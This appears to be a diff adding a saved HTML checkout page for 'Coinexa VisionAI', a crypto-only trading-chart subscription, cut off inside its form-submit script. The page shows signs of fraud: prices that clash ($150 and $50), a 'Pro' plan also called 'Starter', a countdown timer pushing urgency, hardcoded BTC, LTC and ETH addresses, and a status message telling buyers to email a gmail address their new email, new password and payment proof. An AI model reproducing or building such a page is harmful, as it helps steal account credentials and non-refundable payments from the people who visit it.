@@ -1,0 +1,841 @@
+<html lang="en"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_31yqEY"></div><head>
+  <meta charset="UTF-8">
+  <title>Coinexa – Starter Plan Checkout</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --bg: #020617;
+      --bg-card: #050816;
+      --border: #1f2937;
+      --accent: #f5b947;
+      --accent-soft: rgba(245,185,71,0.16);
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --danger: #f97316;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: radial-gradient(circle at top, #020617, #020617 35%, #000000 100%);
+      color: var(--text);
+      display: flex;
+      align-items: stretch;
+      justify-content: center;
+      padding: 1.2rem 0.9rem;
+    }
+
+    .page-shell {
+      width: 100%;
+      max-width: 960px;
+      margin: auto;
+      display: grid;
+      grid-template-columns: minmax(0, 1.15fr) minmax(0, 0.9fr);
+      gap: 1.3rem;
+    }
+
+    @media (max-width: 768px) {
+      .page-shell {
+        grid-template-columns: minmax(0, 1fr);
+      }
+    }
+
+    .card {
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      background:
+        radial-gradient(circle at top, var(--accent-soft), transparent 55%),
+        var(--bg-card);
+      padding: 1.15rem 1.25rem 1.25rem;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.85);
+    }
+
+    .card-secondary {
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      background: #020617;
+      padding: 1.1rem 1.2rem 1.2rem;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.55rem;
+      margin-bottom: 0.7rem;
+    }
+
+    .brand-mark {
+      width: 32px;
+      height: 32px;
+      border-radius: 999px;
+      background: radial-gradient(circle at 20% 0%, #f5b947, #7c2d12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #0b1120;
+      box-shadow: 0 0 22px rgba(245,185,71,0.75);
+    }
+
+    .brand-text {
+      display: flex;
+      flex-direction: column;
+      gap: 0.1rem;
+    }
+
+    .brand-name {
+      font-size: 0.95rem;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .brand-sub {
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    .page-title {
+      font-size: 1.35rem;
+      font-weight: 600;
+      margin: 0.2rem 0 0.1rem;
+    }
+
+    .page-subtitle {
+      font-size: 0.86rem;
+      color: var(--muted);
+      margin-bottom: 0.65rem;
+    }
+
+    .timer-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+      padding: 0.3rem 0.7rem;
+      border-radius: 999px;
+      border: 1px solid rgba(248, 250, 252, 0.08);
+      background: rgba(15,23,42,0.85);
+      font-size: 0.76rem;
+      color: #fbbf24;
+      margin-bottom: 0.9rem;
+    }
+
+    .timer-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 999px;
+      background: var(--danger);
+      box-shadow: 0 0 16px rgba(248,113,113,0.9);
+    }
+
+    .plan-block {
+      border-radius: 16px;
+      border: 1px solid rgba(148,163,184,0.2);
+      background: rgba(15,23,42,0.85);
+      padding: 0.75rem 0.85rem;
+      margin-bottom: 0.9rem;
+    }
+
+    .plan-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 0.75rem;
+      margin-bottom: 0.4rem;
+    }
+
+    .plan-name {
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+
+    .plan-tag {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: var(--muted);
+    }
+
+    .price-row {
+      display: flex;
+      align-items: baseline;
+      gap: 0.25rem;
+      margin-bottom: 0.2rem;
+    }
+
+    .price-amount {
+      font-size: 1.55rem;
+      font-weight: 600;
+    }
+
+    .price-interval {
+      font-size: 0.8rem;
+      color: var(--muted);
+    }
+
+    .plan-notes {
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    .features-list {
+      list-style: none;
+      padding-left: 0;
+      margin: 0.65rem 0 0;
+      font-size: 0.8rem;
+      color: #d1d5db;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .section-title {
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin: 0.6rem 0 0.35rem;
+    }
+
+    .coin-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.45rem;
+      margin-bottom: 0.6rem;
+    }
+
+    .coin-btn {
+      flex: 1;
+      min-width: 90px;
+      border-radius: 999px;
+      border: 1px solid #374151;
+      background: #020617;
+      color: var(--text);
+      padding: 0.4rem 0.75rem;
+      font-size: 0.8rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.35rem;
+      cursor: pointer;
+      transition: all 0.16s ease;
+    }
+
+    .coin-btn span:first-child {
+      font-size: 0.9rem;
+    }
+
+    .coin-btn.active {
+      border-color: var(--accent);
+      background: #111827;
+      box-shadow: 0 0 20px rgba(245,185,71,0.6);
+      color: #fefce8;
+    }
+
+    .address-box {
+      border-radius: 12px;
+      border: 1px solid #374151;
+      background: #020617;
+      padding: 0.55rem 0.65rem;
+      font-size: 0.78rem;
+    }
+
+    .address-label {
+      color: var(--muted);
+      margin-bottom: 0.2rem;
+    }
+
+    .address-value {
+      word-break: break-all;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-size: 0.78rem;
+    }
+
+    .btn-copy {
+      margin-top: 0.4rem;
+      padding: 0.35rem 0.8rem;
+      border-radius: 999px;
+      border: 1px solid #4b5563;
+      background: #020617;
+      color: var(--text);
+      font-size: 0.76rem;
+      cursor: pointer;
+    }
+
+    .steps {
+      margin-top: 0.8rem;
+      font-size: 0.8rem;
+      color: var(--muted);
+    }
+
+    .steps ul {
+      margin: 0.35rem 0 0.35rem 1rem;
+      padding-left: 0;
+    }
+
+    .steps li {
+      margin-bottom: 0.15rem;
+    }
+
+    .form-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 0.55rem;
+      margin-top: 0.5rem;
+    }
+
+    .field-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.55rem;
+    }
+
+    .field {
+      flex: 1;
+      min-width: 150px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 0.78rem;
+      margin-bottom: 0.18rem;
+      color: var(--muted);
+    }
+
+    .field input,
+    .field textarea {
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid #374151;
+      background: #020617;
+      color: var(--text);
+      padding: 0.4rem 0.55rem;
+      font-size: 0.8rem;
+      outline: none;
+    }
+
+    .field input:focus,
+    .field textarea:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 1px rgba(245,185,71,0.4);
+    }
+
+    .submit-btn {
+      width: 100%;
+      border-radius: 999px;
+      border: none;
+      background: linear-gradient(135deg,#f5b947,#ffdd80);
+      color: #111827;
+      font-weight: 600;
+      font-size: 0.86rem;
+      padding: 0.55rem 1rem;
+      margin-top: 0.6rem;
+      cursor: pointer;
+      box-shadow: 0 16px 32px rgba(245,185,71,0.55);
+    }
+
+    .status-text {
+      font-size: 0.78rem;
+      color: var(--muted);
+      margin-top: 0.4rem;
+    }
+
+    .status-text.warning {
+      color: #f97316;
+    }
+
+    .status-text.success {
+      color: #4ade80;
+    }
+
+    .aside-title {
+      font-size: 0.86rem;
+      font-weight: 500;
+      margin-bottom: 0.3rem;
+    }
+
+    .aside-text {
+      font-size: 0.8rem;
+      color: var(--muted);
+      margin-bottom: 0.45rem;
+    }
+
+    .bullet-list {
+      font-size: 0.78rem;
+      color: #d1d5db;
+      margin: 0.35rem 0 0.5rem;
+      padding-left: 1.1rem;
+    }
+
+    .highlight-box {
+      margin-top: 0.6rem;
+      border-radius: 12px;
+      border: 1px dashed #4b5563;
+      padding: 0.5rem 0.6rem;
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+<style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style></head>
+<body>
+  <div class="page-shell">
+
+    <!-- LEFT: main checkout -->
+    <div class="card">
+      <div class="brand">
+        <div class="brand-mark">CX</div>
+        <div class="brand-text">
+          <div class="brand-name">COINEXA VISIONAI</div>
+          <div class="brand-sub">Pro Plan – Crypto Only</div>
+        </div>
+      </div>
+
+      <h1 class="page-title">Pro plan checkout</h1>
+      <p class="page-subtitle">
+        Complete a one-hour crypto payment session to activate your Coinexa Starter subscription.
+      </p>
+
+      <div class="timer-pill">
+        <span class="timer-dot"></span>
+        <span>Session expires in <strong id="timerDisplay">52:16</strong></span>
+      </div>
+
+      <!-- Plan summary -->
+      <div class="plan-block">
+        <div class="plan-header">
+          <div>
+            <div class="plan-name">Pro · $150.00 / month</div>
+            <div class="plan-tag">Single user · best for new traders</div>
+          </div>
+          <div class="price-row">
+            <div class="price-amount">$150.00</div>
+            <div class="price-interval">/ month</div>
+          </div>
+        </div>
+        <p class="plan-notes">
+          Billed in crypto at current market rate. Your account renews every 30 days, you will have to manually purchase this package again.
+        </p>
+        <ul class="features-list">
+          <li>Unlimited chart uploads</li>
+          <li>Multi-timeframe screenshot linking</li>
+          <li>Advanced structure tagging (BOS / CHoCH)</li>
+          <li>Downloadable AI summaries for your journal</li>
+        <li>Priority processing in peak times</li></ul>
+      </div>
+
+      <!-- Step 1: choose coin + get address -->
+      <h2 class="section-title">Step 1 · Choose your currency</h2>
+      <div class="coin-row">
+        <button type="button" class="coin-btn active" data-coin="BTC">
+          <span>₿</span><span>BTC</span>
+        </button>
+        <button type="button" class="coin-btn" data-coin="LTC">
+          <span>Ł</span><span>LTC</span>
+        </button>
+        <button type="button" class="coin-btn" data-coin="ETH">
+          <span>◆</span><span>ETH</span>
+        </button>
+      </div>
+
+      <div class="address-box">
+        <div class="address-label" id="addressLabel">BTC address:</div>
+        <div class="address-value" id="addressValue">bc1q4h9qnd5slacywkl87umlzxe9zxnpjjjzrjyed2</div>
+      </div>
+      <button type="button" class="btn-copy" id="copyAddressBtn">
+        Copy address
+      </button>
+
+      <!-- Step 2: instructions + form -->
+      <div class="steps">
+        <p><strong>Step 2 · Make the payment and submit your details</strong></p>
+        <ul>
+          <li>Send the crypto equivalent of <strong>$50</strong> to your selected address.</li>
+          <li>Wait for your wallet to show the transaction as sent / pending / confirmed.</li>
+          <li>Copy the blockchain transaction link (TX hash or explorer URL).</li>
+          <li>Fill in the form below so we can link the payment to your account.</li>
+        </ul>
+      </div>
+
+      <form id="checkoutForm" class="form-grid">
+        <div class="field-row">
+          <div class="field">
+
+
+          </div>
+
+        </div>
+
+
+
+
+
+        <button type="submit" class="submit-btn" id="submitBtn" disabled="" style="opacity: 0.75; cursor: default;">
+          I’ve sent the crypto
+        </button>
+
+        <div class="status-text success" id="statusText">Thank you! Please send us a email at coinexa.ai@gmail.com with you're, New email, New password, Block chain link, Screen shot proof x2</div>
+      </form>
+    </div>
+
+    <!-- RIGHT: info / help -->
+    <div class="card-secondary">
+      <div class="aside-title">What happens after I submit?</div>
+      <div class="aside-text">
+        After you send your payment and submit the form, our team will:
+      </div>
+      <ul class="bullet-list">
+        <li>Match your email + TX hash with the payment on-chain.</li>
+        <li>Create or update your Coinexa account with Starter access.</li>
+        <li>Email you your activation confirmation and next steps.</li>
+      </ul>
+
+      <div class="aside-title">Important reminders</div>
+      <ul class="bullet-list">
+        <li>Always double-check the crypto address before sending.</li>
+        <li>Coinexa cannot reverse transactions sent to the wrong address.</li>
+        <li>Keep your TX hash and email consistent so we can verify faster.</li>
+      </ul>
+
+      <div class="highlight-box">
+        💡 <strong>Tip:</strong> After submitting this form, also email your wallet
+        screenshot and the same TX link to
+        <strong>coinexa.ai@gmail.com</strong> for the fastest activation.
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    (function () {
+      const COIN_ADDRESSES = {
+        BTC: "bc1q4h9qnd5slacywkl87umlzxe9zxnpjjjzrjyed2",
+        LTC: "LKhmv1GteaCj2eNREN9iMYdZNzbzDo2Gap",
+        ETH: "0xb446020017eCb21F3ffE3DED59c770cFA0A1A96F"
+      };
+
+      const coinButtons = document.querySelectorAll(".coin-btn");
+      const addressLabel = document.getElementById("addressLabel");
+      const addressValue = document.getElementById("addressValue");
+      const copyBtn = document.getElementById("copyAddressBtn");
+      const timerDisplay = document.getElementById("timerDisplay");
+      const statusText = document.getElementById("statusText");
+      const form = document.getElementById("checkoutForm");
+      const submitBtn = document.getElementById("submitBtn");
+
+      let currentCoin = null;
+      let remaining = 3600; // seconds
+      let timer;
+
+      function formatTime(sec) {
+        const m = Math.floor(sec / 60);
+        const s = sec % 60;
+        return m.toString().padStart(2, "0") + ":" + s.toString().padStart(2, "0");
+      }
+
+      function startTimer() {
+        timerDisplay.textContent = formatTime(remaining);
+        timer = setInterval(() => {
+          remaining--;
+          if (remaining <= 0) {
+            remaining = 0;
+            clearInterval(timer);
+            timerDisplay.textContent = "00:00";
+            statusText.textContent =
+              "Session expired. Refresh this page to start a new 1-hour payment window.";
+            statusText.classList.add("warning");
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = 0.6;
+            submitBtn.style.cursor = "not-allowed";
+          } else {
+            timerDisplay.textContent = formatTime(remaining);
+          }
+        }, 1000);
+      }
+
+      // Start the one-hour session as soon as they land
+      startTimer();
+
+      // Coin selection
+      coinButtons.forEach((btn) => {
+        btn.addEventListener("click", () => {
+          const coin = btn.getAttribute("data-coin");
+          currentCoin = coin;
+
+          coinButtons.forEach((b) => b.classList.remove("active"));
+          btn.classList.add("active");
+
+          const addr = COIN_ADDRESSES[coin] || "—";
+          addressLabel.textContent = coin + " address:";
+          addressValue.textContent = addr;
+          statusText.textContent =
+            "Send the crypto equivalent of $50 to this address, then paste your TX link/hash below.";
+          statusText.classList.remove("warning", "success");
+        });
+      });
+
+      // Copy address
+      copyBtn.addEventListener("click", () => {
+        const text = addressValue.textContent.trim();
+        if (!text || text === "—") {
+          statusText.textContent = "Choose BTC, LTC or ETH first.";
+          statusText.classList.add("warning");
+          return;
+        }
+
+        navigator.clipboard
+          .writeText(text)
+          .then(() => {
+            statusText.textContent = "Address copied. Always double-check in your wallet before sending.";
+            statusText.classList.remove("warning");
+          })
+          .catch(() => {
+            statusText.textContent =
+              "Could not copy automatically. Please select and copy the address manually.";
+            statusText.classList.add("warning");
+          });
+      });
+
+      // Form submit
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        if (remaining <= 0) {
+          statusText.textContent =
+            "Session expired. Refresh this page to start a new checkout.";
+          statusText.classList.add("warning");
+          return;
+        }
+
+        if (!currentCoin) {
+          statusText.textContent = "Please select BTC, LTC or ETH before submitting.";
+          statusText.classList.add("warning");
+          return;
+        }
+
